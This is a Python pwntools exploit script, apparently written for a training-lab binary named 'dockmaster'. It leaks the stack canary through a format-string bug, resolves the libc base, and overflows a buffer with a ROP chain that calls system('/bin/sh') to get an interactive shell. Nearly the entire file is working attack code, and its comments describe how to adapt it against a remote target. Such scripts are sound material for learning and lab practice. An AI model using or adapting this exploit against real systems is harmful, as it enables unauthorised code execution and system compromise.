from pwn import *

context.binary = elf = ELF("/home/kali/Desktop/offsec/prove/0_dockmaster/dockmaster")
libc = elf.libc 

#checksec: NO PIE, NX + CANARY

# find canary offset with gdb (check rax before stack_check_fail after sending cyclic)
# p/x $rax: 0x6161617461616173
# cyclic_find(0x6161617461616173) -> 72

# fs on print feedback -> leak canary
# bof on request access -> rop

canary_offset = 72
saved_rip_offset = canary_offset + 16

fs_canary_index = 25 #offset to read canary value in the stack
fs_libc_addr_index = 23 #offset to read a libc leak, or 22, or 23

#step 1: leak the canary
p = process(elf.path)
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"dockmaster:\n", f"%{fs_canary_index}$lx")
leak = p.recvline().split(b"Dockmaster says: ")[1].decode()
canary = int(leak, 16)
print(f"Found canary: {hex(canary)}")

#step 2: leak libc base 
# (don't need because im running in local), otherwise:
# run in local, get leak, find offset (leak - libc_base)); libc_base = p.libs()[libc_local.path]
# run in remote, get leak_remote, libc_base = leak_remote - offset

libc.address = p.libs()[libc.path]

rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
pop_rdi_ret_gadget = rop.find_gadget(['pop rdi', 'ret'])[0]

#rop_libc = ROP(libc)
system = libc.sym.system
binsh = next(libc.search("/bin/sh\x00"))


payload = flat(
    b'A'*canary_offset,
    p64(canary),
    b'B'*8,
    p64(ret_gadget),
    p64(pop_rdi_ret_gadget),
    p64(binsh),
    p64(system),
)

p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"token:\n", payload)
p.interactive()